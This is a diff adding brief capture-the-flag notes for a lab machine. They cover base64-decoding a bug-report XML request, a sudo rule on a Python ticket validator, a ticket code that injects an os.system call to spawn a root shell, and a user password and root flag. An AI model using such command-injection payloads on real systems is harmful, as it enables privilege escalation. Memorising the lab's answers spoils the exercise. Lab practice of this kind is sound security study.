@@ -1,0 +1,29 @@
+BY USING INSPECT ELEMENT ON BOWSER THAN GO TO NETWORK GOT THIS BELOW :
+PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KCQk8YnVncmVwb3J0PgoJCTx0aXRsZT5ZVDwvdGl0bGU+CgkJPGN3ZT5UWVU8L2N3ZT4KCQk8Y3Zzcz5XUlJXPC9jdnNzPgoJCTxyZXdhcmQ+RVI8L3Jld2FyZD4KCQk8L2J1Z3JlcG9ydD4=
+
+THAN USE THIS COMMAND : 
+echo"PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KCQk8YnVncmVwb3J0PgoJCTx0aXRsZT5ZVDwvdGl0bGU+CgkJPGN3ZT5UWVU8L2N3ZT4KCQk8Y3Zzcz5XUlJXPC9jdnNzPgoJCTxyZXdhcmQ+RVI8L3Jld2FyZD4KCQk8L2J1Z3JlcG9ydD4=" | base64 -d
+
+THAN GOT THIS :
+<?xml  version="1.0" encoding="ISO-8859-1"?>
+		<bugreport>
+		<title>YT</title>
+		<cwe>TYU</cwe>
+		<cvss>WRRW</cvss>
+		<reward>ER</reward>
+		</bugreport>
+		
+		
+		
+CREATE XML FILE MANUALLY OR LIKE THIS BELOW GIVEN	
+echo "PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KCQk8YnVncmVwb3J0PgoJCTx0aXRsZT5ZVDwvdGl0bGU+CgkJPGN3ZT5UWVU8L2N3ZT4KCQk8Y3Zzcz5XUlJXPC9jdnNzPgoJCTxyZXdhcmQ+RVI8L3Jld2FyZD4KCQk8L2J1Z3JlcG9ydD4=" | base64 -d > BOUNTY.xml
+
+user pass : 837dc72e20e57f3b5da8c0481e496615
+
+
+(root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
+
+__Ticket code:__
+**704+4 = 708 and __import__('os').system("/bin/sh")
+
+root flag da9906e8bfea72d766d95d5c4a484c0a
